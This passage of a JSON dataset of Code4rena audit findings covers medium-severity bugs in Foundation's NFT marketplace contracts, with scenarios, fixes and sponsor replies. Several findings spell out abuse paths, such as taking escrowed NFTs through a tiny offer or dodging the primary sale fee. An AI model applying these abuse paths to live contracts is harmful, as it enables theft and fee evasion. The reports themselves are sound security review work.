      "content": "_Submitted by leastwood_\n\n[NFTMarketOffer.sol#L255-L271](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L255-L271)<br>\n[NFTMarketReserveAuction.sol#L557](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L557)<br>\n[NFTMarketReserveAuction.sol#L510-L515](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L510-L515)<br>\n[NFTMarketFees.sol#L188-L189](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketFees.sol#L188-L189)<br>\n\nOnce an auction has ended, the highest bidder now has sole rights to the underlying NFT. By finalizing the auction, fees are charged on the sale and the NFT is transferred to `auction.bidder`. However, if `auction.bidder` accepts an offer before finalization, fees will be charged on the `auction.bidder` sale before the original sale. As a result, it is possible to avoid paying the primary foundation fee as a creator if the NFT is sold by `auction.bidder` before finalization.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n*   Alice creates an auction and is the NFT creator.\n*   Bob bids on the auction and is the highest bidder.\n*   The auction ends but Alice leaves it in an unfinalized state.\n*   Carol makes an offer on the NFT which Bob accepts.\n*   `_acceptOffer()` will distribute funds on the sale between Bob and Carol before distributing funds on the sale between Alice and Bob.\n*   The first call to `_distributeFunds()` will set the `_nftContractToTokenIdToFirstSaleCompleted` to true, meaning that future sales will only be charged the secondary foundation fee.\n\n### Recommended Mitigation Steps\n\nEnsure the `_nftContractToTokenIdToFirstSaleCompleted` is correctly tracked. It might be useful to ensure the distribution of funds are in the order of when the trades occurred. For example, an unfinalized auction should always have its fees paid before other sales.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/73#issuecomment-1058004784):**\n > Yes! This is a good find.\n> \n> The core of the problem is we were calling `_distributeFunds` before calling `_transferFromEscrow` where the auction finalization would be processed. We have flipped those calls so now the auction will be fully settled before we calculate fees for the offer sale.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the code found in the NFTMarketOffer, NFTMarketReserveAuction, and NFTMarketFees contracts. The issue is that when an auction is left in an unfinalized state and someone makes an offer on the NFT which is accepted by the highest bidder, fees will be charged on the sale between the highest bidder and the offer-maker before the original sale between the creator and the highest bidder. This could lead to the creator avoiding paying the primary foundation fee if the NFT is sold by the highest bidder before finalization.\n\nTo demonstrate the issue, a scenario was provided. In this scenario, Alice creates an auction and is the NFT creator, Bob bids on the auction and is the highest bidder, the auction ends but Alice leaves it in an unfinalized state, Carol makes an offer on the NFT which Bob accepts, and the first call to `_distributeFunds()` will set the `_nftContractToTokenIdToFirstSaleCompleted` to true.\n\nThe bug was discovered through manual code review. To mitigate the issue, the recommended steps are to ensure the `_nftContractToTokenIdToFirstSaleCompleted` is correctly tracked and to ensure the distribution of funds are in the order of when the trades occurred.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/73",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1595",
      "title": "[M-17] There is no Support For The Trading of Cryptopunks",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\nCryptopunks are at the core of the NFT ecosystem. As one of the first NFTs, it embodies the culture of NFT marketplaces. By not supporting the trading of cryptopunks, Foundation is at a severe disadvantage when compared to other marketplaces. Cryptopunks have their own internal marketplace which allows users to trade their NFTs to other users. As such, cryptopunks does not adhere to the `ERC721` standard, it will always fail when the protocol attempts to trade them.\n\n### Proof of Concept\n\nHere is an example [implementation](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L417-L424) of what it might look like to integrate cryptopunks into the Foundation protocol.\n\n### Recommended Mitigation Steps\n\nConsider designing a wrapper contract for cryptopunks to facilitate standard `ERC721` transfers. The logic should be abstracted away from the user such that their user experience is not impacted.\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/74#issuecomment-1058006585):**\n > Yes, crypto punks is an important part of the ecosystem and this is on our radar. We are not planning on adding support at this time but we will revisiting this in the future.\n> \n> I like the idea of using a wrapper contract of sorts. We will be looking for a way to keep the complexity out of the market contract itself like you suggest if at all possible.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the Foundation protocol not supporting the trading of Cryptopunks, a type of Non-Fungible Token (NFT). This puts the Foundation protocol at a severe disadvantage compared to other marketplaces, as Cryptopunks have their own internal marketplace which allows users to trade their NFTs to other users. The bug report includes a proof of concept implementation of what it might look like to integrate Cryptopunks into the Foundation protocol. The bug report recommends mitigating the issue by designing a wrapper contract for Cryptopunks to facilitate standard ERC721 transfers. This will ensure the user experience is not impacted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/74",
      "tags": [
        "CryptoPunks"
      ],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1594",
      "title": "[M-16] Inappropriate support of EIP-2981",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n[NFTMarketCreators.sol#L65-L82](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketCreators.sol#L65-L82)<br>\n\n```solidity\nif (nftContract.supportsERC165Interface(type(IRoyaltyInfo).interfaceId)) {\n  try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (\n    address receiver,\n    uint256 /* royaltyAmount */\n  ) {\n    if (receiver != address(0)) {\n      recipients = new address payable[](1);\n      recipients[0] = payable(receiver);\n      // splitPerRecipientInBasisPoints is not relevant when only 1 recipient is defined\n      if (receiver == seller) {\n        return (recipients, splitPerRecipientInBasisPoints, true);\n      }\n    }\n  } catch // solhint-disable-next-line no-empty-blocks\n  {\n    // Fall through\n  }\n}\n```\n\nThe current implementation of EIP-2981 support will always pass a constant `BASIS_POINTS` as the `_salePrice`.\n\nAs a result, the recipients that are supposed to receive less than 1 BPS of the salePrice may end up not receiving any royalties.\n\nFurthermore, for the NFTs with the total royalties rate set less than 10% for some reason, the current implementation will scale it up to 10%.\n\n### Recommended Mitigation Steps\n\n1.  Instead of passing a constant of 10,000 as the `_salePrice`, we suggest using the actual `_salePrice`, so there the royalties can be paid for recipients with less than 1 BPS of the royalties.\n2.  When the total royalties cut is lower than 10%, it should be honored. It's capped at 10% only when the total royalties cut is higher than 10%.\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/58#issuecomment-1062159151):**\n > Yes, these are valid points and something we will consider revisiting in the future.\n> \n> RE recommendations:\n>  1) This can only impact < 0.01% of the payment so not a concern ATM. It may be more appropriate to better honor exact amounts, but it's a non-trivial change to an important code path so we will leave it as-is for now. With payments that small, it's probably more appropriate to be using a contract to manage the payouts - e.g. https://www.0xsplits.xyz/ could handle this well.\n>  2) I agree. ATM we always enforce exactly 10% so that there is a consistent experience with our market and on our website. We will revisit this in the future, and the idea of capping it to 10% but accepting lower is a great one.\n\n\n\n***\n\n",
      "summary": "\nThis bug report details an issue with the implementation of EIP-2981 support in the code. Currently, the code always passes a constant of 10,000 as the '_salePrice', which means that recipients that are supposed to receive less than 1 BPS of the salePrice may end up not receiving any royalties. Additionally, if the total royalties cut is lower than 10%, the code will scale it up to 10%. The report recommends two changes to the code: use the actual '_salePrice' so that royalties can be paid for recipients with less than 1 BPS of the royalties, and honor the total royalties cut if it is lower than 10%.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/58",
      "tags": [
        "Royalty",
        "ERC2981",
        "EIP-2981"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1593",
      "title": "[M-15] Royalties can be distribution unfairly among creatorRecipients for NFT contracts with non-standard getRoyalties() returns",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketCreators.sol#L85-L112\n\n\n## Vulnerability details\n\nBased on our research, `getRoyalties()` is not a standardized API for NFT contracts to indicate how the royalties should be distributed among the recipients.\n\nHowever, in the current implementation, it always assumes that `getRoyalties()` return in terms of BPS.\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketCreators.sol#L85-L112\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L86-L90\n\n```solidity\nif (creatorShares[i] > BASIS_POINTS) {\n    // If the numbers are >100% we ignore the fee recipients and pay just the first instead\n    maxCreatorIndex = 0;\n    break;\n}\n```\n\nAs a result, if a particular implementation is returning `get Royalties()` with higher precision (say 1e6 for 100% instead of 1e4/BPS), the distribution of royalties can be distorted.\n\n### PoC\n\nGiven:\n\n* `NFT-Token1` `Royalties`:\n\n  - Address0 = 10,000 (1%)\n  - Address1 = 10,000 (1%)\n  - Address2 = 100,000 (10%)\n  - Address3 = 880,000 (88%)\n\n* Alice owns the `NFT-Token1`\n\n1. Alice `setBuyPrice()` and listed `NFT-Token1` for `10 ETH`;\n\n2. Bob `buy()` with `10 ETH`:\n\n  - `foundationFee` = `0.5 ETH`\n  - `creatorFee` = `1 ETH`\n  - `ownerRev` = `8.5 ETH `\n\nSince `creatorShares[address2]` > `BASIS_POINTS` (10,000), all the `creatorFee` will be sent to the first address: `Address0`, which is expected to receive only `1%` of the royalties.\n\n### Recommendation\n\nConsider removing this and change to:\n\n```solidity\n// Determine the total shares defined so it can be leveraged to distribute below\nuint256 totalShares;\nunchecked {\n  // The array length cannot overflow 256 bits.\n  for (uint256 i = 0; i <= maxCreatorIndex; ++i) {\n    // The check above ensures totalShares wont overflow.\n    totalShares += creatorShares[i];\n  }\n}\nif (totalShares == 0) {\n  maxCreatorIndex = 0;\n}\n```",
      "summary": "\nThis bug report is about a vulnerability that affects the NFT contract implementation of the 2022-02-foundation project. The vulnerability is related to the `getRoyalties()` API, which is not a standardized API for NFT contracts to indicate how the royalties should be distributed among the recipients. In the current implementation, it always assumes that `getRoyalties()` return in terms of BPS. This can lead to a distortion in the distribution of royalties if a particular implementation is returning `get Royalties()` with higher precision.\n\nAs an example, if Alice owns the `NFT-Token1` and sets the buy price and lists it for 10 ETH, when Bob buys it with 10 ETH, the `foundationFee` is 0.5 ETH, the `creatorFee` is 1 ETH, and the `ownerRev` is 8.5 ETH. Since `creatorShares[address2]` is greater than `BASIS_POINTS` (10,000), all the `creatorFee` will be sent to the first address, `Address0`, which is only expected to receive 1% of the royalties.\n\nThe recommendation to fix this vulnerability is to remove the current code and replace it with new code that determines the total shares defined so it can be leveraged to distribute the royalties correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/57",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1592",
      "title": "[M-14] Upgradable escrow contract",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nUpgradable escrow contract poses great risk to user who approved their NFT to the contract. Most popular token / NFT exchange do not require user to approve their asset to admin upgradable contract.\n\nThis also increases user gas usage because they would have to revoke approval when they are done with the protocol.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/FNDNFTMarket.sol>\n\n### Recommended Mitigation Steps\n\nSeparate the escrow contract to make it non-upgradable with a restricted set of functionality.\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/53#issuecomment-1057450900):**\n > This is an interesting suggestion. I'm not sure if the recommendation really reduces the risk though. If we were to make the escrow portion immutable, the trust still depends on the upgradeable market contract to do the correct thing. If I'm understanding the suggestion correctly, the terms of the deal would still be defined in the upgradeable contract - so even with an immutable escrow manager we could theoretically upgrade the market to allow us to `buy` each of the NFTs for 0 ETH.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the FNDNFTMarket.sol contract, which is part of the 2022-02-foundation project. It poses great risk to users who approve their Non-Fungible Tokens (NFTs) to the contract. The vulnerability could also increase user gas usage because they would have to revoke approval when they are done with the protocol. A proof of concept is provided in the report.\n\nThe recommended mitigation step is to separate the escrow contract to make it non-upgradable with a restricted set of functionality. This will reduce the risk to users and will also reduce the user's gas usage.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/53",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1591",
      "title": "[M-13] Escrowed NFT can be stolen by anyone if no active buyPrice or auction exists for it",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L77-L87\n\n\n## Vulnerability details\n\n\t\n\n## Impact\n\nIf a NFT happens to be in escrow with neither buyPrice, nor auction being initialised for it, there is a way to obtain it for free by any actor via `makeOffer`, `acceptOffer` combination.\n\nI.e. a malicious user can track the FNDNFTMarket contract and obtain any NFT from it for which there are no buyPrice or auction structures initialised. For example, if a NFT is mistakenly sent to the contract, an attacker can immediately steal it.\n\nThis will happen as NFT is being guarded by buyPrice and auction structures only. The severity here is medium as normal usage of the system imply that either one of them is initialised (NFT was sent to escrow as a part of `setBuyPrice` or `createReserveAuction`, and so one of the structures is present), so this seems to leave only mistakenly sent assets exposed.\n\n## Proof of Concept\n\nAn attacker can make a tiny offer with `makeOffer`:\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L189\n\nThen call `acceptOffer`, which will lead to `_acceptOffer`.\n\nDirect NFT transfer will fail in `_acceptOffer` as the NFT is being held by the contract and `_transferFromEscrow` will be called instead:\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L262-L271\n\n`_transferFromEscrow` calls will proceed according to the FNDNFTMarket defined order:\n```\nfunction _transferFromEscrow(\n...\n) internal override(NFTMarketCore, NFTMarketReserveAuction, NFTMarketBuyPrice, NFTMarketOffer) {\n   super._transferFromEscrow(nftContract, tokenId, recipient, seller);\n}\n```\n\nIf there are no corresponding structures, the NFTMarketOffer, NFTMarketBuyPrice and NFTMarketReserveAuction versions of `_transferFromEscrow` will pass through the call to NFTMarketCore's plain transfer implementation:\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L77-L87\n\nThis will effectively transfer the NFT to the attacker, which will pay gas costs and an arbitrary small offer price for it.\n\n## Recommended Mitigation Steps\n\nConsider adding additional checks to control who can obtain unallocated NFTs from the contract.\n\nProtocol controlled entity can handle such cases manually by initial sender's request.",
      "summary": "\nThis bug report is about a vulnerability in the FNDNFTMarket contract, which allows malicious users to obtain NFTs from the contract for free. This is possible if a NFT is mistakenly sent to the contract and no buyPrice or auction structures have been initialised for it. The severity of this vulnerability is medium, as it only affects NFTs that have been mistakenly sent to the contract. \n\nThe vulnerability can be exploited by an attacker making a tiny offer with the `makeOffer` function and then calling `acceptOffer`, which will lead to the `_acceptOffer` function. This will then call `_transferFromEscrow`, which will transfer the NFT to the attacker.\n\nThe recommended mitigation step is to add additional checks to control who can obtain unallocated NFTs from the contract. Alternatively, a protocol controlled entity can handle such cases manually by the initial sender's request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/51",
      "tags": [],
      "finders": [
        "hyh",
        "wuwe1"
      ]
    },
    {
      "id": "1590",
      "title": "[M-12] Private sale spoofing",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\n[NFTMarketPrivateSale.sol#L156](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketPrivateSale.sol#L156)<br>\n\nSimilar to [spoofing in finance](https://en.wikipedia.org/wiki/Spoofing_\\(finance\\)), users can create private sales with correct signatures but then frontrun the buy with a transfer to a different wallet they control.\n\nNo funds are lost as the NFT <> FETH exchange is atomic but it can be bad if third parties create a naive off-chain centralized NFT market based on this signature feature.<br>\nIt's also frustrating for the users if they try to accept the private sale but their transaction fails.\n\n### Recommended Mitigation Steps\n\nThis is made possible because private sales do not keep the NFT in escrow.<br>\nConsider escrowing the NFT also for private sales.\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/46#issuecomment-1057389683):**\n > We are actually considering moving private sales to an escrow system. But we'll leave it as-is for now for backwards compatibility and to simplify our upcoming launch.\n> \n> We understand this could happen and will update the comments to make that more clear.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that allows users to spoof private sales of NFTs (Non-Fungible Tokens). This vulnerability allows users to create private sales with correct signatures but then frontrun the buy with a transfer to a different wallet they control. This means that no funds are lost, but it can be problematic if third parties create a naive off-chain centralized NFT market based on this signature feature. It is also frustrating for users if their transaction fails. The vulnerability is caused by private sales not keeping the NFT in escrow. The recommended mitigation steps for this vulnerability is to consider escrowing the NFT also for private sales.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/46",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1589",
      "title": "[M-11] MAX_ROYALTY_RECIPIENTS_INDEX set too low",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L78\n\n\n## Vulnerability details\n\n## Impact\nThe creator payouts are capped at `MAX_ROYALTY_RECIPIENTS_INDEX`. It's currently set to `4` and only 5 creators are paid out.\nOther creators are ignored.\n\n## Recommended Mitigation Steps\nI don't think cases with more than 5 creators / royalty receivers are unlikely.\nIt can and should probably be increased, especially as the transfers are already gas restricted.",
      "summary": "\nThis bug report is about a vulnerability in the code of a software project, which could have an impact on the payouts for creators. The issue is that the creator payouts are capped at a certain number and any creators beyond that number are not paid out. The recommended mitigation step is to increase the number of creators that can be paid out, as the transfers are already gas restricted. This bug report is a reminder to developers to be aware of the limitations of the code and to ensure that all creators are accounted for when setting up payouts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/45",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1588",
      "title": "[M-10] LockedBalance library should drop parameters to 96/32 bits",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/libraries/LockedBalance.sol#L56\n\n\n## Vulnerability details\n\n## Impact\nThe `LockedBalance` contract takes 256-bit amount values but performs bit math on them as if they were 96 bit values.\nBits could spill over to a different locked balance in the `else` part (`lockedBalance` stores **two** 128-bit locked balances in one 256-bit storage field):\n\n```solidity\nfunction set(\n  Lockups storage lockups,\n  uint256 index,\n  uint256 expiration,\n  uint256 totalAmount\n) internal {\n  unchecked {\n    // @audit-issue should drop totalAmount to 96, expiration to 128-96=32\n    uint256 lockedBalanceBits = totalAmount | (expiration << 96);\n    if (index % 2 == 0) {\n      // set first 128 bits.\n      index /= 2;\n      // @audit-info clears upper bits, then sets them\n      lockups.lockups[index] = (lockups.lockups[index] & last128BitsMask) | (lockedBalanceBits << 128);\n    } else {\n      // set last 128 bits.\n      index /= 2;\n      // @audit-info clears lower bits, then sets them\n      // @audit-issue sets entire 256-bit lockedBalanceBits instead of just 128-bit\n      lockups.lockups[index] = (lockups.lockups[index] & first128BitsMask) | lockedBalanceBits;\n    }\n  }\n}\n```\n\nIt could then increase the other, unrelated locked balance's amount leading to stealing funds from the protocol.\nAll callers of this function currently seem to ensure that `totalAmount` is indeed less than 96 bits but the `LockedBalance` library should be self-contained and not depend on the calling side to perform all checks.\nIf the code is ever extended and more calls to these functions are performed, it'll likely cause issues.\n\n> The same issue happens in `setTotalAmount`\n\n## Recommended Mitigation Steps\nMake sure that there are only 96/32 bits set in `totalAmount` and `expiration` by dropping them to their respective types.\n\n```diff\nfunction set(\n  Lockups storage lockups,\n  uint256 index,\n  uint256 expiration,\n  uint256 totalAmount\n) internal {\n  unchecked {\n-    uint256 lockedBalanceBits = totalAmount | (expiration << 96);\n+    // cast it to uint256 again for the << 96 to work on 256-bits\n+    uint256 lockedBalanceBits = uint256(uint96(totalAmount)) | (uint256(uint32(expiration)) << 96);\n    \n    ...\n  }\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the `LockedBalance` contract. The contract takes 256-bit amount values but performs bit math on them as if they were 96 bit values. This could lead to bits spilling over to a different locked balance in the `else` part of the contract and increase the other, unrelated locked balance's amount, potentially leading to funds being stolen from the protocol. All current callers of this function ensure that `totalAmount` is less than 96 bits, but the `LockedBalance` library should not depend on the calling side to perform all checks. \n\nThe recommended mitigation steps for this vulnerability are to make sure that there are only 96/32 bits set in `totalAmount` and `expiration` by dropping them to their respective types. This can be done by casting it to `uint256` again for the `<< 96` to work on 256-bits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/44",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1587",
      "title": "[M-09] Missing receiver validation in withdrawFrom",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/FETH.sol#L433\n\n\n## Vulnerability details\n\n## Impact\nThe `FETH.withdrawFrom` function does not validate its `to` parameter.\nFunds can be lost if `to` is the zero address.\n\n> Similar issues have been judged as medium recently, see [Sandclock M-15](https://code4rena.com/reports/2022-01-sandclock/) / [Github issue](https://github.com/code-423n4/2022-01-sandclock-findings/issues/183#issuecomment-1024626171)\n\n## Recommended Mitigation Steps\nCheck that `to != 0`.",
      "summary": "\nThis bug report is about the `FETH.withdrawFrom` function in the contract found at the given link. This function does not validate its `to` parameter, which could result in funds being lost if `to` is the zero address. This issue has been judged as medium recently, as seen in the linked report and Github issue. The recommended mitigation step is to check that `to != 0`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/42",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1586",
      "title": "[M-08] Primary seller can avoid paying the primary fee",
      "impact": "MEDIUM",
      "content": "_Submitted by pedroais, also found by leastwood and WatchPug_\n\nA primary seller can circumvent the 15% fee and pay 5% as a secondary seller.\n\n### Context\n\nThe Foundation protocol charges a 15% fee if the sale is a primary sale and 5% if it's a secondary sale.<br>\n<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L40>\n\nThere are 2 conditions that must be met for a sale to be considered primary:\n\n1.  The seller is one of the creators in the NFT metadata.\n2.  It's the first time this NFT is sold on the foundation protocol.\n\n<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L188>\n\n### Proof of Concept\n\nBoth of these conditions can be easily circumvented by the primary seller.\n\n1.  He could transfer the NFT to a different wallet and sell it from there to break the first condition.\n\n2.  He can make a private sale to himself for 1\\$  (paying the 15% fee on a dust amount) and then do a public auction with the real price.\n\nWith any of these 2 methods, the primary seller can circumvent the 15% fee and pay 5% as a secondary seller which makes the primary seller fee optional to pay.\n\n**[NickCuso (Foundation) acknowledged amd commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/39#issuecomment-1057366311):**\n > Yes, this **is** possible. It's a good limitation to note and we should have it called out as a known issue / potential abuse path.\n> \n> It's not clear how we could avoid this though while still keeping primary fees around - so I think all we can do is document it for now. This has been true since our launch a year ago and we are not aware of anyone abusing it yet. We think that's because NFT provenance is very important, so if it was being sold from a different account than the creator it's possible that would not get as much attention and potentially sell for less than they could have gotten accepting the primary sale fee.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Foundation Protocol which allows the primary seller to circumvent the 15% fee and pay 5% as a secondary seller. The Foundation Protocol charges a 15% fee if the sale is a primary sale and 5% if it's a secondary sale. The primary seller must meet two conditions for a sale to be considered primary: 1) the seller must be one of the creators in the NFT metadata, and 2) it must be the first time the NFT is sold on the Foundation Protocol. However, both of these conditions can be easily circumvented by the primary seller. The primary seller can transfer the NFT to a different wallet and sell it from there to break the first condition, and they can make a private sale to themselves for a very small amount and then do a public auction with the real price in order to break the second condition. With either of these methods, the primary seller can avoid the 15% fee and pay 5% as a secondary seller.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/39",
      "tags": [],
      "finders": [
        "pedroais",
        "leastwood  WatchPug"
      ]
    },
    {
      "id": "1585",
      "title": "[M-07] _getCreatorPaymentInfo() is Not Equipped to Handle Reverts on an Unbounded _recipients Array",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCreators.sol#L49-L251\n\n\n## Vulnerability details\n\n## Impact\n\nThe `_getCreatorPaymentInfo()` function is utilised by `_distributeFunds()` whenever an NFT sale is made. The function uses `try` and `catch` statements to handle bad API endpoints. As such, a revert in this function would lead to NFTs that are locked in the contract. Some API endpoints receive an array of recipient addresses which are iterated over. If for whatever reason the function reverts inside of a `try` statement, the revert is actually not handled and it will not fall through to the empty `catch` statement.\n\n## Proof of Concept\n\nThe end result is that valid and honest NFT contracts may revert if the call runs out of gas due to an unbounded `_recipients` array. `try` statements are only able to handle external calls.\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider bounding the number of iterations to `MAX_ROYALTY_RECIPIENTS_INDEX` as this is already enforced by `_distributeFunds()`. It may be useful to identify other areas where the `try` statement will not handle reverts on internal calls.",
      "summary": "\nThis bug report is about a vulnerability in the `_getCreatorPaymentInfo()` function used by `_distributeFunds()` whenever an NFT sale is made. The function uses `try` and `catch` statements to handle bad API endpoints, but if the function reverts inside of a `try` statement, the revert is not handled and it will not fall through to the empty `catch` statement. This results in valid and honest NFT contracts reverting if the call runs out of gas due to an unbounded `_recipients` array. The bug was identified using manual code review. The recommended mitigation step is to consider bounding the number of iterations to `MAX_ROYALTY_RECIPIENTS_INDEX` as this is already enforced by `_distributeFunds()`. It is also suggested to identify other areas where the `try` statement will not handle reverts on internal calls.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/85",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1584",
      "title": "[M-06] buyFromPrivateSaleFor() Will Fail if The Buyer Has Insufficient Balance Due to an Open Offer on The Same NFT",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L143-L150\n\n\n## Vulnerability details\n\n## Impact\n\nThe `buyFromPrivateSaleFor()` function allows sellers to make private sales to users. If insufficient `ETH` is provided to the function call, the protocol will attempt to withdraw the amount difference from the user's unlocked balance. However, if the same user has an open offer on the same NFT, then these funds will remain locked until expiration. As a result, the user cannot make use of these locked funds even though they may be needed for a successful sale.\n\n## Proof of Concept\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider adding a `_cancelBuyersOffer()` call to the `buyFromPrivateSaleFor()` function. This should be added only to the case where insufficient `ETH` was provided to the trade. By cancelling the buyer's offer on the same NFT, we can guarantee that the user has access to the correct amount of funds.",
